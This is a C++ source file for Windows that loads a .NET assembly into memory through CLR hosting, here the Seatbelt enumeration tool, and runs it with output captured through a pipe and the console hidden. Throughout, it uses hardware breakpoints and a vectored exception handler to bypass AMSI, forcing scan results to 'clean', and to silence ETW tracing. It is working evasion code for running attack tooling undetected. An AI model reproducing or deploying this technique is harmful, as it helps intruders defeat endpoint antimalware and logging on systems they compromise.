#include <Windows.h>
#include <metahost.h>
#include <stdio.h>
#include <ntstatus.h>

#pragma comment(lib, "mscoree.lib")
#define PIPE_BUFFER_LENGTH 0x10000

namespace mscorlib {
    #include "mscorlib.h"
}

BOOL HwbpEngineBreakpoint(
    _In_ ULONG Position,
    _In_ PVOID Function
) {
	CONTEXT Context = {};

	SecureZeroMemory(&Context, sizeof(Context));

	Context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
	if (!GetThreadContext(GetCurrentThread(), &Context)) {
	    printf("[-] GetThreadContext Failed with Error: %lx\n", GetLastError());
	    return FALSE;
	}

	//
	// if function has been specified then add
	// the function to the debug registers
	//
	if (Function) {
		//
		// add hardware breakpoint
		//
		(&Context.Dr0)[Position] = (UINT_PTR)Function;

		Context.Dr7 &= ~(3ull << (16 + 4 * Position));
		Context.Dr7 &= ~(3ull << (18 + 4 * Position));
		Context.Dr7 |= 1ull << (2 * Position);
	}
	else {
		//
		// remove the function
		//
		(&Context.Dr0)[Position] = 0;

		//
		// disable the debug flag at the specified position
		//
		Context.Dr7 &= ~(1ull << (2 * Position));
	}

	if (!SetThreadContext(GetCurrentThread(), &Context)) {
		printf("[-] SetThreadContext Failed with Error: %lx\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL HwbpEngineHandler(
	_Inout_ PEXCEPTION_POINTERS Exceptions
) {
    LONG			  Result      = {};
	PVOID			  AmsiAddress = {}; 
	PVOID			  EtwAddress  = {};
	PEXCEPTION_RECORD Exception   = {};
	PCONTEXT		  Context	  = {};
	UINT_PTR		  Return      = {};
	PULONG			  ScanResult  = {};

	AmsiAddress = GetProcAddress(GetModuleHandleA("amsi.dll"), "AmsiScanBuffer");
	EtwAddress  = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTraceEvent");
	Exception   = Exceptions->ExceptionRecord;
	Context     = Exceptions->ContextRecord;

	if (Exception->ExceptionCode == EXCEPTION_SINGLE_STEP)
	{
	    if (Exception->ExceptionAddress == AmsiAddress)
	    {
			//
		    // receive the return address to jump back to the caller
		    // and the 6th argument which is the AMSI_RESULT argument
		    //
			Return     = *(PULONG_PTR)Context->Rsp;
			ScanResult = (PULONG)(*(PULONG_PTR)(Context->Rsp + (6 * sizeof(PVOID))));

			//
		    // modify the AMSI_RESULT state to AMSI_RESULT_CLEAN
		    //
			*ScanResult = 0;

			//
			// set the current instruction to
			// the caller and adjust the stack
			// and set the return value to S_OK
			//
			Context->Rip  = Return;
			Context->Rsp += sizeof(PVOID);
			Context->Rax  = S_OK;

			return EXCEPTION_CONTINUE_EXECUTION;
		}

		if (Exception->ExceptionAddress == EtwAddress)
		{
			//
			// fast exit the NtTraceEvent function call
			// by jumping back to the caller, adjust the
			// stack and specify the return value to be STATUS_SUCCESS
			//
			Context->Rip  = *(PULONG_PTR)Context->Rsp;
			Context->Rsp += sizeof(PVOID);
			Context->Rax  = STATUS_SUCCESS;

			return EXCEPTION_CONTINUE_EXECUTION;
		}
	}

	return EXCEPTION_CONTINUE_SEARCH;
}

HRESULT DotnetExecute(
	_In_  PBYTE  AssemblyBytes,
	_In_  ULONG  AssemblySize,
	_In_  PWSTR  AppDomainName,
	_In_  PWSTR  Arguments,
	_Out_ LPSTR* OutputBuffer,
	_Out_ PULONG OutputLength
) {
	HRESULT			       HResult         = {};
	ICLRMetaHost*	       IMetaHost       = {};
	ICLRRuntimeInfo*       IRuntimeInfo    = {};
	ICorRuntimeHost*       IRuntimeHost    = {};
	IUnknown*		       IAppDomainThunk = {};
	mscorlib::_AppDomain*  AppDomain       = {};
	mscorlib::_Assembly*   Assembly        = {};
	mscorlib::_MethodInfo* MethodInfo      = {};
	SAFEARRAYBOUND		   SafeArrayBound  = {};
    SAFEARRAY* 			   SafeAssembly	   = {};
	SAFEARRAY*			   SafeExpected    = {};
	SAFEARRAY*			   SafeArguments   = {};
	PWSTR*				   AssemblyArgv    = {};
	ULONG 				   AssemblyArgc    = {};
	LONG				   Index		   = {};
	VARIANT                VariantArgv     = {};
	BOOL			       IsLoadable	   = {};
	HWND				   ConExist		   = {};
	HWND				   ConHandle	   = {};
	HANDLE				   BackupHandle    = {};
	HANDLE				   IoPipeRead      = {};
	HANDLE				   IoPipeWrite     = {};
	SECURITY_ATTRIBUTES    SecurityAttr    = {};
	HANDLE				   ExceptionHandle = {};

	//
	// create the CLR instance 
	//
	if ((HResult = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, reinterpret_cast<PVOID*>(&IMetaHost)))) {
		printf("[-] CLRCreateInstance Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] CLRCreateInstance: %lx\n", HResult);

	//
	// get the CLR instance version to host and start 
	//
	if ((HResult = IMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, reinterpret_cast<PVOID*>(&IRuntimeInfo)))) {
		printf("[-] IMetaHost->GetRuntime Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] IMetaHost->GetRuntime: %lx\n", HResult);

	//
	// check if the runtime we specified is loadable for the current process 
	//
	if ((HResult = IRuntimeInfo->IsLoadable(&IsLoadable)) || !IsLoadable) {
		printf("[-] IRuntimeInfo->IsLoadable Failed with Error: %lx (IsLoadable: %s)\n", HResult, IsLoadable ? "true" : "false");
		goto _END_OF_FUNC;
	}
	else printf("[*] IRuntimeInfo->IsLoadable: %lx\n", HResult);

	//
	// now load the specified CLR version into the current process
	//
	if ((HResult = IRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, reinterpret_cast<PVOID*>(&IRuntimeHost)))) {
		printf("[-] IRuntimeInfo->GetInterface Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] IRuntimeInfo->GetInterface: %lx\n", HResult);

	//
	// start the loaded CLR version in our current process 
	//
	if ((HResult = IRuntimeHost->Start())) {
		printf("[-] IRuntimeHost->Start Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	} else printf("[*] IRuntimeHost->Start: %lx\n", HResult);

	//
	// prepare app domain for execution of the assembly 
	//

	//
	// create a new app domain in the current CLR runtime 
	//
	if ((HResult = IRuntimeHost->CreateDomain(AppDomainName, nullptr, &IAppDomainThunk))) {
		printf("[-] IRuntimeHost->CreateDomain Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] IRuntimeHost->CreateDomain: %lx\n", HResult);

    //
	// query app domain interface from the created app domain thunk
	//
	if ((HResult = IAppDomainThunk->QueryInterface(IID_PPV_ARGS(&AppDomain)))) {
		printf("[-] IAppDomainThunk->QueryInterface Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] IAppDomainThunk->QueryInterface: %lx\n", HResult);

	//
	// load assembly file into a safe array for AppDomain->Load_3 
	//
	SafeArrayBound = { AssemblySize, 0 };
	SafeAssembly   = SafeArrayCreate(VT_UI1, 1, &SafeArrayBound);

    memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);

	//
	// set hardware breakpoints on etw and AMSI api functions 
	//
	HwbpEngineBreakpoint(0, GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer"));
	HwbpEngineBreakpoint(1, GetProcAddress(LoadLibraryA("ntdll.dll"), "NtTraceEvent"));
	if (!(ExceptionHandle = AddVectoredExceptionHandler(TRUE, (PVECTORED_EXCEPTION_HANDLER)HwbpEngineHandler))) {
		printf("[-] AddVectoredContinueHandler Failed with Error: %lx\n", GetLastError());
		goto _END_OF_FUNC;
	}

	//
	// load the specified appdomain into the created appdomain 
	//
	if ((HResult = AppDomain->Load_3(SafeAssembly, &Assembly))) {
		printf("[-] AppDomain->Load_3 Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] AppDomain->Load_3: %lx\n", HResult);

	//
    // get entry point from the loaded assembly
    //
	if ((HResult = Assembly->get_EntryPoint(&MethodInfo))) {
		printf("[-] Assembly->get_EntryPoint Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] Assembly->get_EntryPoint: %lx\n", HResult);

	//
	// check if arguments are expected
	//
	if ((HResult = MethodInfo->GetParameters(&SafeExpected))) {
		printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] MethodInfo->GetParameters: %lx\n", HResult);

	//
	// create arguments to be passed to the assembly entry point method 
	//
	if (SafeExpected) {
		if (SafeExpected->cDims && SafeExpected->rgsabound[0].cElements) {
			SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);

			if (wcslen(Arguments)) {
				AssemblyArgv = CommandLineToArgvW(Arguments, (PINT)&AssemblyArgc);
			}

			VariantArgv.parray = SafeArrayCreateVector(VT_BSTR, 0, AssemblyArgc);
			VariantArgv.vt = (VT_ARRAY | VT_BSTR);

			for (Index = 0; Index < AssemblyArgc; Index++) {
				SafeArrayPutElement(VariantArgv.parray, &Index, SysAllocString(AssemblyArgv[Index]));
			}

			Index = 0;
			SafeArrayPutElement(SafeArguments, &Index, &VariantArgv);
			SafeArrayDestroy(VariantArgv.parray);
		}
	}

	//
	// create an anonymous pipe to redirect the current
	// executed assembly file output into a pipe for us
	// to catch and store into a buffer 
	//
	SecurityAttr = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
	if (!(CreatePipe(&IoPipeRead, &IoPipeWrite, nullptr, PIPE_BUFFER_LENGTH))) {
		printf("[-] CreatePipe Failed with Error: %lx\n", GetLastError());
		HResult = GetLastError();
		goto _END_OF_FUNC;
	}

	//
	// allocate a new console for the current process
	// if no console is available or has been allocated
	//
	if (!(ConExist = GetConsoleWindow())) {
		AllocConsole();
		if ((ConHandle = GetConsoleWindow())) {
			ShowWindow(ConHandle, SW_HIDE);
		}
	}

	BackupHandle = GetStdHandle(STD_OUTPUT_HANDLE);
	SetStdHandle(STD_OUTPUT_HANDLE, IoPipeWrite);

	//
	// invoke the main assembly entry point
	// with the created arguments 
	//
	if ((HResult = MethodInfo->Invoke_3(VARIANT(), SafeArguments, nullptr))) {
		printf("[-] MethodInfo->GetParameters Failed with Error: %lx\n", HResult);
		goto _END_OF_FUNC;
	}
	else printf("[*] MethodInfo->Invoke_3: %lx\n", HResult);

	//
	// allocate memory to write the output from
	// the pipe into the allocated buffer 
	//
	if ((*OutputBuffer = static_cast<LPSTR>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_LENGTH)))) {
		if (!ReadFile(IoPipeRead, *OutputBuffer, PIPE_BUFFER_LENGTH, OutputLength, nullptr)) {
			printf("[-] ReadFile Failed with Error: %lx\n", GetLastError());
			goto _END_OF_FUNC;
		}
	} else {
		HResult = ERROR_NOT_ENOUGH_MEMORY;
	}
	
_END_OF_FUNC:
	HwbpEngineBreakpoint(0, nullptr);
	HwbpEngineBreakpoint(1, nullptr);
	RemoveVectoredExceptionHandler(ExceptionHandle);

	if (BackupHandle) {
		//
		// restore original std handle from backup 
		//
		SetStdHandle(STD_OUTPUT_HANDLE, BackupHandle);
	}

	if (IoPipeRead) {
		CloseHandle(IoPipeRead);
	}

	if (IoPipeWrite) {
		CloseHandle(IoPipeWrite);
	}

    if (AssemblyArgv) {
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, AssemblyArgv);
		AssemblyArgv = nullptr;
    }

	if (SafeAssembly) {
		SafeArrayDestroy(SafeAssembly);
		SafeAssembly = nullptr;
	}

	if (SafeArguments) {
		SafeArrayDestroy(SafeArguments);
		SafeArguments = nullptr;
	}

	if (MethodInfo) {
		MethodInfo->Release();
	}

	if (IRuntimeHost) {
		IRuntimeHost->Release();
	}

    if (IRuntimeInfo) {
		IRuntimeInfo->Release();
    }

	if (IMetaHost) {
	    IMetaHost->Release();
	}

	return HResult; 
}

BOOL ReadFileFromDiskA(IN LPCSTR cFileName, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize) {

	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwFileSize = NULL,
		dwNumberOfBytesRead = NULL;
	PBYTE		pBaseAddress = NULL;

	if (!cFileName || !pdwFileSize || !ppFileBuffer)
		goto _END_OF_FUNC;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileA Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		printf("[!] GetFileSize Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!(pBaseAddress = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!ReadFile(hFile, pBaseAddress, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		printf("[!] ReadFile Failed With Error: %d \n[i] Read %d Of %d Bytes \n", GetLastError(), dwNumberOfBytesRead, dwFileSize);
		goto _END_OF_FUNC;
	}

	*ppFileBuffer = pBaseAddress;
	*pdwFileSize = dwFileSize;

_END_OF_FUNC:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (pBaseAddress && !*ppFileBuffer)
		HeapFree(GetProcessHeap(), 0x00, pBaseAddress);
	return (*ppFileBuffer && *pdwFileSize) ? TRUE : FALSE;
}

int main() {
    PBYTE AssemblyBytes = {};
    ULONG AssemblySize  = {};
	LPSTR OutputBuffer  = {};
	ULONG OutputLength  = {};

	if (!ReadFileFromDiskA("Seatbelt.exe", &AssemblyBytes, &AssemblySize)) {
	    puts("[-] ReadFileFromDiskA Failed");
		return 1;
	}

	printf("[*] Assembly %p @ [%d bytes]\n", AssemblyBytes, AssemblySize);

	if (DotnetExecute(AssemblyBytes, AssemblySize, (PWSTR)L"MyAppDomain", (PWSTR)L"antivirus", &OutputBuffer, &OutputLength)) {
		puts("[-] DotnetExecute Failed");
	} else printf("[*] Assembly Output [%d bytes]:\n%s", OutputLength, OutputBuffer);

	HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, OutputBuffer);
}